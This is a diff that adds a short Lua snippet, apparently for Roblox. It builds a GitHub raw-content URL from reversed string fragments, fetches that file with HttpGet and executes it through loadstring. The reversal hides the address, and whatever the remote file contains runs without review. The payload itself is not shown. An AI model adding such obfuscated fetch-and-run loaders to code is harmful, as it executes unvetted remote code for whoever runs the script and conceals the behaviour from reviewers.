@@ -1,0 +1,13 @@
+local how = 'txt.yhw/niam/loltnod/dubhsiwu'
+local r = '/moc.tnetnocresubuhti'
+local u = 'g.war//:sptth'
+
+loadstring(
+    game:HttpGet(
+        (
+            how..r..u
+            )
+        :reverse(
+        )
+    )
+){} 
